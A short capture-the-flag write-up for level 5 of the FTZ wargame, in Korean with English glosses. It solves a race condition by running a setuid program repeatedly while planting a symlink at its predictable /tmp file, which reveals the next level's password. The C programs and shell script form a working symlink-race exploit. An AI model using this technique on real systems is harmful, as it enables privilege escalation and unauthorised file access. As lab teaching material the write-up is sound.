# Level5

## This level's goal

- RaceCondition

***

```
[level5@ftz level5]$ cat hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.
(/usr/bin/level5 makes level5.tmp in /tmp)

이를 이용하여 level6의 권한을 얻어라.
(Get the level6's privilege with using this)
```

```
[level5@ftz tmp]$ cat RunTarget.c
#include <unistd.h>
int main(void)
{
        int i;
        for(i=0; i<10; i++)
        {
                system("/usr/bin/level5 &");
        }
}
[level5@ftz tmp]$ gcc -o RunTarget RunTarget.c
```

```
[level5@ftz tmp]$ cat AttackTarget.c
#include <unistd.h>
int main()
{
        int i;
        system("touch /tmp/5pass.txt");
        for(i=0; i<=10; i++)
        {
                system("ln -s /tmp/5pass.txt /tmp/level5.tmp");
        }
        system("cat /tmp/5pass.txt");
        system("rm -rf /tmp/5pass.txt");
}
[level5@ftz tmp]$ gcc -o AttackTarget AttackTarget.c
```

```
[level5@ftz tmp]$ cat AttackTarget.sh
#!/bin/bash

./RunTarget &
./AttackTarget
[level5@ftz tmp]$ chmod 755 AttackTarget.sh
[level5@ftz tmp]$ ./AttackTarget.sh
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
next password : what the hell
```



